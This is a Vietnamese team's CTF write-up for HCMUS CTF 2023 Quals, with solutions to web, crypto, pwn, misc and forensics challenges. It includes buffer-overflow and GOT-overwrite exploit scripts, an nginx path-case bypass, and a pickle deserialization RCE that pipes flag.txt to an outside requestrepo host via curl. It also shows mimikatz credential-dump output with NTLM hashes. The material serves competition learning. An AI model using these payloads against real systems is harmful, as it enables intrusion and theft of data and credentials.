# HCMUS CTF 2023 QUALS WRITEUP

> Giải HCMUS CTF 2023 Quals vừa qua team mình đã may mắn lọt vào top 10 và sau đây là writeups các bài mà team mình đã giải được 😋
>
> ![image-20230508224746781](./assets/image-20230508224746781.png)

## WEB
### Safe Proxy
Ở bài này chương trình là một ứng dụng proxy site, `/proxy/?url=http://127.0.0.1/....` sử dụng param url và trả về một đoạn svg là một capture của browser truy cập url
Ban đầu mình cũng đã thử các protocol nhưng đều bị fail hết, mình đã nghĩ là các protocol này đều bị chặn hết nên đã bỏ qua và stuck rất lâu :))
Sau khi hint được release thì mình quay lại xem có bỏ sót điều gì hay không và mình phát hiện ra `view-source:...` không bị chặn gì hết :)

![upload_be07834efd0b33033f0cf3ba47bd8fa7.png (1877×791) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_be07834efd0b33033f0cf3ba47bd8fa7.png)

Một điều nữa là `view-source:file:///` có thể list dir luôn :0 và mình có thể thấy được flag tại đó là `/h3r3_1z_f14g`
![upload_84da294b0433edbe66d64dd5cf341034.png (1685×593) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_84da294b0433edbe66d64dd5cf341034.png)
`Flag: HCMUS-CTF{browser_scheme_is_interesting!}`


### Cute Quote
Challenge cho mình source code 

![upload_9f7d5a7069065e4ca6ac399781cc0349.png (282×354) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_9f7d5a7069065e4ca6ac399781cc0349.png)

Trong file app.js
```javascript
const express = require('express')
const app = express()
const port = 3000

app.use(express.json())
app.use(express.static('css'))

app.get('/', (req, res) => {
  res.sendFile('./index.html', { root: __dirname })
})




const quotes = ['Insanity: doing the same thing expecting different results', '{{7*7}}', '<?php system("whoami"); ?>', '42 is the Answer to the Ultimate Question of Life, the Universe, and Everything']
app.get('/api/public/quote', (req, res) => {
  let quote = quotes[Math.floor(Math.random() * quotes.length)]
  res.send(quote)
})

app.get('/api/public/fake', (req, res) => {
  res.send("HMCSU-CFT{fake_flag}")
})

const flag = process.env.FLAG || "HCMUS-CTF{real_flag}"
app.get('/api/private/flag', (req, res) => {
  res.send(flag)
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})
```
Theo như source code thì mình chỉ cần truy cập đến `/api/private/flag` là có flag
Mà trong file `nginx.conf` location đến `/api/private/` là 403, vậy nên mình cần bypass chỗ này
```nginx
upstream loadbalancer {
  server web:3000;
}

server {
  listen 80;
  server_name _;
  location / {
    proxy_pass http://loadbalancer;
  }

  location /api/private/ {
    return 403; # disable private api
  }
}
```
Cuối cùng mình chỉ cần bypass bằng cách truy cập đến `/api/PrIvAtE/flag` là có flag :)
`Flag: HCMUS-CTF{when_nginx_meet_express}`

## CRYPTO
### bootleg aes
enc.sh
```bash
echo "$(cat pad.bin)$FLAG" > flag.bin
ls -alF ./pad.bin
x=$(openssl rand -hex 32)
echo $x
openssl enc -aes-256-cbc -K $x -iv $(openssl rand -hex 16) -in flag.bin -out ciphertext.bin
```
log.txt
```
-rw-r--r-- 1 hoang hoang 256 Apr  2 13:03 ./pad.bin
c9a391c6f65bbb38582044fd78143fe72310e96bf67401039b3b6478455a1622
```


Các lệnh thực thi trong file sh này có response được lưu trong file log
- Như mình có thể thấy trong file enc.sh thì chương trình thực hiện pad trước flag là nội dung của file `pad.bin` và lưu vào trong file `flag.bin`
- `ls -alF ./pad.bin` trả về `-rw-r--r-- 1 hoang hoang 256 Apr  2 13:03 ./pad.bin` nên mình có thể biết được độ dài của file pad này là 256
- `x=$(openssl rand -hex 32)`  khởi tạo biến x được random 32 bytes lưu ở dạng hex
- `echo $x` được trả về trong file log `c9a391c6f65bbb38582044fd78143fe72310e96bf67401039b3b6478455a1622`
- `openssl enc -aes-256-cbc -K $x -iv $(openssl rand -hex 16) -in flag.bin -out ciphertext.bin` thực hiện thuật toán mã hoá AES 256 MODE CBC để mã hoá nội dung trong file `flag.bin` với key là `$x` và iv được random 16 bytes, kết quả trả về trong file `ciphertext.bin`

Vì mình đã có key nên mình có thể decrypt được ciphertext từ block thứ 2 trở đi, mà đoạn đầu của flag đã được pad thêm 256 bytes rồi nên việc decrypt không ảnh hưởng gì đến flag hết

```bash
openssl enc -d -aes-256-cbc -iv "00000000000000000000000000000000" -K "c9a391c6f65bbb38582044fd78143fe72310e96bf67401039b3b6478455a1622" -S "" -in ciphertext.bin -out flag`
```
`flag: HCMUS-CTF{it5_c4ll3d_pr1v4t3_k3y_crypt09raphy_f0r_4_r3450n}`
### Falsehood
prob.py
```python
import os
import numpy as np
from sage.all import ComplexField, PolynomialRing
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import random
from binascii import hexlify

FLAG = os.getenv('FLAG', "FLAG{this is a real flag}")
bits = 1111
C = ComplexField(bits)
P = PolynomialRing(C, names='x')
(x,) = P.gens()

key_array = np.random.choice(256, size=(16,))
key = b''.join([int(i).to_bytes(1, 'big') for i in key_array])

f = sum([coeff * x**i for i, coeff in enumerate(key_array)])
hint = []
for _ in range(16):
    X = random.randint(10**8, 10**10)
    Y = int(abs(f(X)))
    while [X, Y] in hint:
        X = random.randint(10**8, 10**10)
        Y = int(abs(f(X)))
    hint.append([X, Y])


cip = AES.new(key, AES.MODE_CBC)
ct = cip.encrypt(pad(FLAG.encode(),16))
iv = cip.iv
with open('output.txt', 'w') as file:
    file.write(str(hint)+'\n')
    print(f"ct = {hexlify(ct).decode()}, iv = {hexlify(iv).decode()}", file=file)
```
Đề bài cho mình flag được mã hóa bằng AES CBC mode, key được tạo bằng cách tạo 1 mảng key random gồm rồi gộp tất cả các bytes của phần tử trong mảng đó lại thành key. Từng phẩn tử trong key_array được làm hệ số của hàm `f(x)=k0.x^0 + k1.x^1 +…+k15.x^15`
Hint đã cho mình các điểm rồi thì mình thế vào là tìm được key
Code tìm key sử dụng Lagrange bằng sage:
```python
R.<x> = PolynomialRing(QQ)
points = [[8833677163, 7159466859734884050485160017085648949938620549936739498951806707835448713685207536552299918328868591349533273061478374089984223260577742322460362334647], [1762352339, 226021067407224282748442153993506422184559341973942542463611713009302649608941949660293486972516731321467369225717344439888178648461773300463], [6814325828, 145915445591160853098610646953738314537732696913127480076359637783667652244881400087606152610739138506056218199806589240306741950875956525839170443027], [7865890147, 1255960511416167089973436987379886082394930531153251392262351559661203914293720867397614316726175343133363293139291718249474745356688772183204229822751], [3446680058, 5293859406843167459297872689128502546567761548640003856519557803475599388573073027426285178678302790672452768542207529392596772806973985884693237], [5877771652, 15883583178415793156782570756223737797760371065858523945056072346852806064052610100332389954372845836435762293469821829936427366159434784004504398291], [5589586633, 7472281200056449019563455444999813482028446397663996508394508567670602924631065370355170602075256758870709465268255309886778027432655593535614166637], [1175276268, 518629639886914674796931012497083502361229856009622285824810204881645367508380387007577326543311405957619591605841895258801496781885398507], [3312651249, 2920072124198357353277671402963439479294095254775553378538026906919501392975483266953780010186413153114694525677661955925502702904273824951901573], [1690420045, 120969905638890571692249167310237577968012605711450331530578304692989016303379573026678222839813088165787719888874515256743894818676147474521], [8298141391, 2802013920829536770649820952830225273137583982204944734413323800249577243089166668778583649665043009034143120874987986020037964205143133245123290632883], [733386150, 439287044309927586596972381366960178061704411347096135895831191742005839221734048948610767236121358802659929070752762370822244956535801], [7897145685, 1332938401210287323326359805632057169759318295533885927320250339098837407040892547133970478663396358868892779722453565866390506758764909670000617998161], [9797888335, 33864534898740204255025855638155912349784294672865719351405048784504660475905319925895086755774471151890089727930776090169445401259844048317273142069811], [4557234547, 349364318043137479854576449493426376983315472777226775365310579193760250715517761090058069937282741206013319707277840448237966901906357292702335951], [7667001731, 855344863189641492213600127143839128290386097202448105626863527763958015786114563445357087338205788545215994676722500375202243293047596358065835329663]]
R.lagrange_polynomial(points)
```
Sau khi chạy code ta có đa thức f(x) như sau:
````
poly = 46*x^15 + 201*x^14 + 113*x^13 + 44*x^12 + 154*x^11 + 78*x^10 + 203*x^9 + 175*x^8 + 3*x^7 + 24*x^6 + 106*x^5 + 171*x^4 + 9*x^3 + 144*x^2 + 31*x + 151
````


 lấy các bytes coeff của nó, giải mã AES CBC có key, iv là xong
```python
from sage.all import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from binascii import unhexlify

with open('output.txt', 'r') as file:
    hint = eval(file.readline())

C = ComplexField(1111)
P = PolynomialRing(C, names='x')
(x,) = P.gens()

poly = 46*x**15 + 201*x**14 + 113*x**13 + 44*x**12 + 154*x**11 + 78*x**10 + 203*x**9 + 175*x**8 + 3*x**7 + 24*x**6 + 106*x**5 + 171*x**4 + 9*x**3 + 144*x**2 + 31*x + 151

coeffs = [int(round(float(c.real()))) for c in poly.coefficients()]
print(coeffs)

key = bytes(coeffs)
print(key)
ct = "be205fd34ebe59af55ea11fec9aea50197fbf35d5b52c650a6c9563186625e8b6021ba31db538fa4b60c69a42c96ee3bebaba53ac9afa9c3c185d4d0b145bc8251d892c243f1aa4037aeea003714e24c"
iv = "370abc6fce33f812de7b88daaa82e4c4"

cip = AES.new(key, AES.MODE_CBC, unhexlify(iv))
pt = unpad(cip.decrypt(unhexlify(ct)), 16)
print(pt.decode())
```
`flag: HCMUS-CTF{just_because_you're_correct_doesn't_mean_you're_right}`

### M side
prob.py 
```python
from Crypto.Util.number import getStrongPrime, bytes_to_long as b2l, isPrime
import os


FLAG = os.getenv('FLAG', 'FLAG{hue_hue_hue}').encode()
p = getStrongPrime(512)
q = getStrongPrime(512)
while not isPrime(4 * p * p + q * q):
    p = getStrongPrime(512)
    q = getStrongPrime(512)

hint = 4 * p * p + q * q
e = 65537
print(f"hint: {hint}")
# n for wat?
print(f"ct: {pow(b2l(FLAG), e, p * q)}")

"""
hint: 461200758828450131454210143800752390120604788702850446626677508860195202567872951525840356360652411410325507978408159551511745286515952077623277648013847300682326320491554673107482337297490624180111664616997179295920679292302740410414234460216609334491960689077587284658443529175658488037725444342064697588997
ct: 8300471686897645926578017317669008715657023063758326776858584536715934138214945634323122846623068419230274473129224549308720801900902282047728570866212721492776095667521172972075671434379851908665193507551179353494082306227364627107561955072596424518466905164461036060360232934285662592773679335020824318918
"""
```
Nhập hints lên alpertron tìm (2p)^2 + q^2 là có p, q, giải mã RSA.
```python
p=19253294223314315727716037086964210594461001022934798241434958729430216563195726834194376256655558434205505701941181260137383350002506166062809813588037666//2
ct=8300471686897645926578017317669008715657023063758326776858584536715934138214945634323122846623068419230274473129224549308720801900902282047728570866212721492776095667521172972075671434379851908665193507551179353494082306227364627107561955072596424518466905164461036060360232934285662592773679335020824318918
q=9513749018075983034085918764185242949986187938391728694055305209717744257503225678393636438369553095045978207938932347555839964566376496993702806422385729
e=65537
pi=(p-1)*(q-1)
from Crypto.Util.number import *
d=pow(e,-1,pi)
print(long_to_bytes(pow(ct,d,p*q)))
```
`flag: HCMUS-CTF{either_thu3_0r_3uclid_wh1ch3v3r_it_t4k35}`
### CRY1
Challenge cho mình một file server.py
```python
import time
import random
import threading
import socketserver
import os

FLAG_FILE = os.getenv("FLAG")
PORT = int(os.getenv("APP_PORT"))
HOST = "0.0.0.0"

assert FLAG_FILE is not None, "Environment variable FLAG not set"
assert PORT is not None, "Environment variable APP_PORT not set"


class Service(socketserver.BaseRequestHandler):
    def handle(self):
        self.flag = self.get_flag()
        self.user_id = int(time.time())
        self.send(f"Welcome\n")
        assert len(self.flag) == 26
        self.send(
            f"Here is your encoded flag: {self.encode(self.flag, self.gen_key(self.user_id, len(self.flag)))}\n"
        )

    def get_flag(self):
        with open(FLAG_FILE, "r") as f:
            return f.readline()

    def encode(self, data, key):
        return sum([a * ord(b) for a, b in zip(key, data)])

    def gen_key(self, user_id, n):
        random.seed(user_id)
        return [random.randrange(1024) for i in range(n)]

    def send(self, string: str):
        self.request.sendall(string.encode("utf-8"))

    def receive(self):
        return self.request.recv(1024).strip().decode("utf-8")


class ThreadedService(
    socketserver.ThreadingMixIn,
    socketserver.TCPServer,
    socketserver.DatagramRequestHandler,
):
    pass


def main():
    service = Service
    server = ThreadedService((HOST, PORT), service)
    server.allow_reuse_address = True
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()

    print("Server started on " + str(server.server_address) + "!")
    # Now let the main thread just wait...
    while True:
        time.sleep(10)


if __name__ == "__main__":
    main()

```
Chương trình tạo key bằng hàm `gen_key()` trả về 1 mảng có 26 phần tử, mỗi phần tử được `random.randrange(1024)` với seed được khởi tạo bằng `random.seed(user_id)` mà `user_id` ở đây chính là thời gian hiện tại `time.time()` 
```python
    def gen_key(self, user_id, n):
        random.seed(user_id)
        return [random.randrange(1024) for i in range(n)]
```
Về hàm `encode()` thì chương trình thực hiện tính sum của tích từng kí tự của flag với key tương ứng
```python
    def encode(self, data, key):
        return sum([a * ord(b) for a, b in zip(key, data)])
```
Để giải challenge này thì mình chỉ cần gen ra 26 phương trình để giải phương trình 26 ẩn
```python
from pwn import *
import time
import random
import os
from z3 import *


def gen_key(user_id):
    random.seed(user_id)
    return [random.randrange(1024) for i in range(26)]


seed = []
encoded = []
for i in range(26):
    p = process('ncat --ssl cry1.chall.ctf.blackpinker.com 443'.split())
    t = int(time.time())
    p.recvuntil(b'flag: ')
    flag_enc = int(p.recvline().strip())
    seed.append(t)
    encoded.append(flag_enc)
    p.close()
    time.sleep(1)
arr = [Int(f'x{i}') for i in range(26)]
s = Solver()
for i in range(26):
    s.add(And(0x20 < arr[i], arr[i] < 0x7f))
s.add(arr[0:10] == list(map(ord, 'HCMUS-CTF{')))
s.add(arr[25] == ord('}'))

for i in range(26):
    data = gen_key(seed[i])
    s.add(sum([a * b for a, b in zip(arr, data)]) == encoded[i])

while s.check() == sat:
    model = s.model()
    print(''.join([chr(model[x].as_long()) for x in arr]))
    s.add(Or([arr[i] != model[arr[i]] for i in range(10, 26)]))

```
`Flag: HCMUS-CTF{the_EASIEST_0ne}`
## PWN

### python is safe

![upload_a610ff03be489d3491eea63430ba2598.png (750×405) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_a610ff03be489d3491eea63430ba2598.png)

Đề cho ta một file python như trên, khởi tạo `buf1`, `buf2` sau đó `gets buf1`. Để `buf2` có `HCMUS-CTF` thì ta sẽ lợi dụng buffer overflow ở hàm `gets`.

Tiếp theo ta tạo payload : 
![upload_10dc1d367778f1bde8fb1147b6f8a640.png (1700×214) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_10dc1d367778f1bde8fb1147b6f8a640.png)

Flag : `HCMUS-CTF{pYt40n_4rE_s|U|Perrrrrrr_5ecureeeeeeeeeeee}`

### coin mining

Đề cho ta 1 file libc, 1 file binary
Đầu tiên ta checksec

![upload_f3e0b6a28a9e80ec5c938ea2d3743d73.png (1027×263) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_f3e0b6a28a9e80ec5c938ea2d3743d73.png)

Tiếp theo vào ida coi thử

![upload_d0d071ec1cd133dcefb64b23edd66b65.png (860×570) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_d0d071ec1cd133dcefb64b23edd66b65.png)

Ta thấy có lỗi buffer overflow ở biến `buf`, ngoài ra hàm `printf` cũng có thể được dùng để leak canary, libc

Do đó ý tưởng sẽ là leak libc, leak canary, cuối cùng là overwrite return address của main thành `one_gadget`

![upload_7a6cc2cd86b9c79dfc87216f9c76e6a9.png (998×422) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_7a6cc2cd86b9c79dfc87216f9c76e6a9.png)

Ở đây mình dùng địa chỉ đầu tiên phát ăn ngay.

Tiếp theo viết script, ở đây ta gdb tính offset như bình thường
Script:
```python
from pwn import *
exe = ELF("coin_mining_patched")
libc = ELF("libc.so.6")
p = process(exe.path)

p.sendline(b'1')
payload = b'a'*103
p.sendline(payload)
p.recvuntil(b'a'*103+b'\n')
libc_leak = p.recvn(6) + b'\x00\x00'
libc_leak = u64(libc_leak)
libc.address = libc_leak-275593
print('LIBC LEAK : ',hex(libc_leak))
print('LIBC BASE : ',hex(libc.address))
payload = b'a'*136
p.sendline(payload)
p.recvuntil(b'a'*136+b'\n')
cana_leak= u64(b'\x00'+ p.recvn(7))

print('CANA LEAK : ',hex(cana_leak))

payload = b'notHMCUS-CTF{a_coin_must_be_here}\n\x00'+ b'a'*101 + p64(cana_leak) + b'a'*8 +p64(libc.address+0x4f2c5)
p.sendline(payload)
print(len(payload))
p.interactive()
```
Flag: `HCMUS-CTF{gA1n_coin_everyday_better_c01n_better_he4th}`
### string chan
Đề cho ta 1 file binary
Đầu tiên ta `checksec` 

![upload_b13f78230b2fe478eade0b67ea22dcc9.png (1045×220) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_b13f78230b2fe478eade0b67ea22dcc9.png)

Tiếp theo vào ida xem thử

![upload_19b0b1b8e7174a5ce8fbd988a147f6df.png (840×606) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_19b0b1b8e7174a5ce8fbd988a147f6df.png)


Đề sẽ in ra các options để lựa chọn, trong đó:
- Chọn 1,2 để tạo và in ra C-style string
- Chọn 3,4 để tạo và in ra C++ string
- Chọn khác các option trên sẽ thoát vòng lặp, thoát chương trình

Ngoài ra cũng ra cũng có hàm này không được gọi ở đâu nhưng sẽ cho ta shell

![upload_a343871519044de879a611d6f6156725.png (496×149) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_a343871519044de879a611d6f6156725.png)

Tiếp theo vào gdb debug xem hướng giải:
- Khi ta chọn 1 và nhập full A, thì thấy ở đây có buffer overflow do sài `cin`
![upload_7adae9828ce3d13c37d9f38447c9e166.png (1595×387) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_7adae9828ce3d13c37d9f38447c9e166.png)

- Chọn 3 thì sẽ nhập vào con trỏ có sẵn trên stack. Nếu nhập quá độ dài cho phép thì nó sẽ cấp phát động địa chỉ heap thay vì nhập trên stack do implement của string trong C++
![upload_84816947cf61b5d0a443875add56733d.png (1571×372) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_84816947cf61b5d0a443875add56733d.png)

Tới đây ta có hướng giải là ghi đè địa chỉ stack kia thành một địa chỉ nào đó trong `got` thành địa chỉ chỗ hàm lấy shell kia do có `no pie` và `partial relro`
Ta thấy khi ta chọn option bất kỳ thì thấy nó sẽ gọi hàm ở `0x401180` để in ra byte, nhưng địa chỉ này lại không ghi được, thay vào đó có địa chỉ `0x404048` cho phép ta ghi

![upload_da59b8cef3664994abe2be92bdc1d4c2.png (1754×594) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_da59b8cef3664994abe2be92bdc1d4c2.png)

Cuối cùng viết script:
```python
from pwn import *
exe = ELF("chall")

p = process(exe.path)
p.sendlineafter(b'choice: ',b'1')
p.sendlineafter(b'c_str: ',b'a'*32+p64(0x404048))

p.sendlineafter(b'choice: ',b'3')
p.sendlineafter(b'str: ',p64(0x4016de))

p.sendline(b'5')
p.interactive()
```
Flag: `HCMUS-CTF{it's_ok_i_still_love_you}`

### Pickle Trouple
Challenge cho mình một file server.py
```python
import pandas as pd
import io
import time
import threading
import socketserver
import sys
from io import StringIO
import secrets
import os
import numpy as np

FLAG_FILE = "flag.txt"
PORT = int(os.getenv("APP_PORT"))
HOST = "0.0.0.0"

original_stdout = sys.stdout

class Service(socketserver.BaseRequestHandler):
    def handle(self):
        captured_output = StringIO()
        sys.stdout = captured_output
        self.flag = self.get_flag()
        
        token = secrets.token_bytes(16)
        
        self.send(b"Gimme your pickle data size (send as byte string)\n")
        data_size = int(self.request.recv(64).decode())
        
        self.send(b"Gimme your pickle data frame (raw bytes)\n")
        pickle_data = self.receive(data_size)
        df = pd.read_pickle(io.BytesIO(pickle_data))
        
        try:
            if bytes(np.random.choice(df["x"], size=16)) == token:
                print(self.flag)
            else:
                raise Exception("Oh no!")
        except Exception as e:
            print("Oops, you missed it!")
            print(e)
        
        self.send(captured_output.getvalue().encode())
        sys.stdout = original_stdout
        
            
    def get_flag(self):
        with open(FLAG_FILE, 'rb') as f:
            return f.readline()
    
    def send(self, s: str):
        self.request.sendall(s.encode("utf-8"))
        
    def send(self, b: bytes):
        self.request.sendall(b)

    def receive(self, b = 1024):
        data = b""
        while len(data) != b:
            data += self.request.recv(256)
        return data
    
class ThreadedService(socketserver.ThreadingMixIn, socketserver.TCPServer, socketserver.DatagramRequestHandler):
    pass

def main():
    service = Service
    server = ThreadedService((HOST, PORT), service)
    server.allow_reuse_address = True
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()

    print("Server started on " + str(server.server_address) + "!")
    # Now let the main thread just wait...
    while True:
        time.sleep(10)
        
if __name__ == "__main__":
    main()

```
Chương trình cho phép mình nhập độ dài của pickle data và pickle data frame rồi sau đó sử dụng pd.read_pickle để đọc object
Mình để ý `pd.read_pickle` này có chức năng cũng giống như `pickle.loads()` nên mình xác định từ đầu đây là lỗi `data serialization in Python with pickle`, mình có thể khai thác lỗi này bằng cách tạo một object mới sử dụng `__reduce__` để RCE rồi sau đó pickle.dumps và gửi lên server
solve.py

```python
from pwn import *
import pickle
import os

class PickleRce():
    def __reduce__(self):
        cmd = "cat flag.txt | curl -d @- r1y7b2aw.requestrepo.com"
        return (os.system,(cmd,))
io=process('ncat --ssl pickle-trouble-4d44b9115f4a0ada.chall.ctf.blackpinker.com 443'.split())
data=pickle.dumps(PickleRce())
io.sendline(str(len(data)).encode())
io.sendline(data)
io.interactive()
```
`Flag: HCMUS-CTF{S||\/|pL3_p1cKlE_ExpL01t-Huh}`

## MISC

### Sanity check
JOIN DISCORD VÀ TÌM FLAG

![upload_5ecf9aa1dda0f4f80d5583f25f37a15a.png (397×573) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_5ecf9aa1dda0f4f80d5583f25f37a15a.png)

`FLAG: HCMUS-CTF{simple_sanity_check}`

### Grind
Bài này cho 3 cái SQLite3 database, mình dùng công cụ SQLiteStudio để mở

![upload_d3e7d4c16ce9ba45fbcda0e6a431dd98.png (255×229) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_d3e7d4c16ce9ba45fbcda0e6a431dd98.png)

Sau đấy thực hiện đoạn truy vấn này:

```sql
SELECT df.rank, df.uid, df.name, d3.points - d2.points AS point_difference, df.points
FROM data_64_day3.ranking d3
JOIN data_64_day2.ranking d2 ON d3.name = d2.name
JOIN data_64_final.ranking AS df ON d3.uid = df.uid
WHERE d3.name REGEXP '[0-9]' AND d3.points - d2.points > 900000000 AND df.rank > 5000
ORDER BY point_difference DESC;
```

Sort kết quả theo rank, đọc lần lượt để tìm cái gì đó có vẻ liên quan tới "a mathematical million-dollar problem" thì mình tìm thấy cái này khá đáng nghi vì trông nó giống ký hiệu toán học.

![upload_6d58819be006ad7b39e04dafb1831469.png (530×442) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_6d58819be006ad7b39e04dafb1831469.png)

Search google thì kết quả wiki hiển thị nó là hàm zeta Riemann (https://vi.wikipedia.org/wiki/H%C3%A0m_zeta_Riemann)

Và hàm Riemann thì lại thuộc ``Millennium Prize Problems``

![upload_085f4a19c8719832b0c9da63c647575a.png (1000×385) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_085f4a19c8719832b0c9da63c647575a.png)

Đến đây thì chuẩn, hoàn toàn chuẩn đây là name mà cần tìm rồi.
ζ(2)=π2/6 = 1.64493406685 ~ 1.6449340668 nếu làm tròn 10 số.
Wrap flag theo đề bài thôi: ``HCMUS-CTF{23983477-1.6449340668-2391789368-9614}``

### japanese

Bài này cho ta 1 file ``huh.txt`` và 1 đoạn chữ tiếng Nhật, tác giả bảo nó là lyrics bài nào đấy (mình không lưu description lại nên là không nhớ nó như nào mà nó cũng không cần thiết lắm).
Tác giả có mô tả bạn mình là 1 thằng wibu, và mọi thứ trong máy tính anh ta đều là tiếng Nhật. Và tác giả yêu cầu mình tìm cái bài hát có chứa lyrics bên trên.

Well thì như mình nói là cái đoạn chữ tiếng Nhật nó không search ra gì cả nên mình tập trung vào cái ``huh.txt``. 
Mở file đấy lên thì thấy 1 đống ký tự không đọc được

![upload_fe3a9218f985ffcf34eb782f0957e00a.png (392×145) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_fe3a9218f985ffcf34eb782f0957e00a.png)

Đề bài có nhắc đến chuyện bạn của tác giả thích đọc thông qua console nên mình nghĩ nó sẽ là kiểu mã hoá ký tự của ngôn ngữ gì đấy. Mình ném lên CyberChef để nó bruteforce Character Encoding thì ra được đây là ``Japanese`` (như đề bài cho thì tác giả để ngôn ngữ hoàn toàn là tiếng Nhật nên là những ký tự được mã hoá theo kiểu ``Japanese Shift`` thay vì UTF-8 như trong Tiếng Anh)

![upload_9b9973d1428007343229953ec942102f.png (1533×922) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_9b9973d1428007343229953ec942102f.png)

Sau khi search đoạn lyrics tiếng Nhật vừa decode thì mình tìm được bài là 威風堂々 (Ifuudoudou), mình search thông tin original song thì tìm được trang này https://vocadb.net/S/17673/related

Tác giả bảo flag theo dạng: HCMUS-CTF{songname-artist1_artist2...} và artist sắp xếp theo thứ tự alphabet tương ứng với chữ cái đầu của họ.

Mình thử khá nhiều flag và flag đúng là
``HCMUS-CTF{ifuudoudou-gumi_hatsunemiku_ia_kagaminerin_megurineluka}``

## FORENSICS
### Kiwi
Bài này cho ``Minidump`` 

![upload_d4cbf66aa548eb4b08e25d37595d6ff6.png (749×47) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_d4cbf66aa548eb4b08e25d37595d6ff6.png)

Nhìn dung lượng thì có thể đoán rằng đây là ``lsass.dmp``.
Tuy nhiên, vì bị đổi tên nên không thể chắc chắn nó có phải là ``lsass.dmp`` hay không nên mình ném vào ``Windbg`` để xác định.
Vào ``Windbg``, mở file ``Minidump``, sau đó dùng lệnh ``!analyze -v`` để phân tích file ``Minidump`` đấy, ta có thể dễ dàng thấy được đây là ``lsass.dmp``

![upload_783d3eb567da62483bfcc1e1b0288de7.png (1170×558) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_783d3eb567da62483bfcc1e1b0288de7.png)

Với ``lsass.dmp`` thì phổ biến nhất là dùng Mimikatz để xem credential.

```

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # sekurlsa::minidump Kiwi
Switch to MINIDUMP : 'Kiwi'

mimikatz # sekurlsa::logonpasswords all
Opening : 'Kiwi' file for minidump...

Authentication Id : 0 ; 287159 (00000000:000461b7)
Session           : Interactive from 1
User Name         : hcmusctf
Domain            : HCMUS
Logon Server      : HCMUS
Logon Time        : 07/05/2023 3:19:58 SA
SID               : S-1-5-21-2385635905-2323104132-2454383018-1000
        msv :
         [00000003] Primary
         * Username : hcmusctf
         * Domain   : HCMUS
         * NTLM     : 4b46c72c1ff4b6d7b90143cde874e03d
         * SHA1     : 029fb493dfc0bd68b6a702ffa4746599894e0fe9
        tspkg :
        wdigest :
         * Username : hcmusctf
         * Domain   : HCMUS
         * Password : HCMUS-CTF{DuMp_cL34r_t3x1_p4sSw0rD_8y_WD1g3sT_4n|)_m1MiK4zt}
        kerberos :
         * Username : hcmusctf
         * Domain   : HCMUS
         * Password : (null)
        ssp :   KO
        credman :

Authentication Id : 0 ; 287118 (00000000:0004618e)
Session           : Interactive from 1
User Name         : hcmusctf
Domain            : HCMUS
Logon Server      : HCMUS
Logon Time        : 07/05/2023 3:19:58 SA
SID               : S-1-5-21-2385635905-2323104132-2454383018-1000
        msv :
         [00000003] Primary
         * Username : hcmusctf
         * Domain   : HCMUS
         * NTLM     : 4b46c72c1ff4b6d7b90143cde874e03d
         * SHA1     : 029fb493dfc0bd68b6a702ffa4746599894e0fe9
        tspkg :
        wdigest :
         * Username : hcmusctf
         * Domain   : HCMUS
         * Password : HCMUS-CTF{DuMp_cL34r_t3x1_p4sSw0rD_8y_WD1g3sT_4n|)_m1MiK4zt}
        kerberos :
         * Username : hcmusctf
         * Domain   : HCMUS
         * Password : (null)
        ssp :   KO
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 07/05/2023 3:19:17 SA
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :   KO
        credman :

Authentication Id : 0 ; 67303 (00000000:000106e7)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 07/05/2023 3:19:17 SA
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : HCMUS$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :   KO
        credman :

Authentication Id : 0 ; 67230 (00000000:0001069e)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 07/05/2023 3:19:17 SA
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
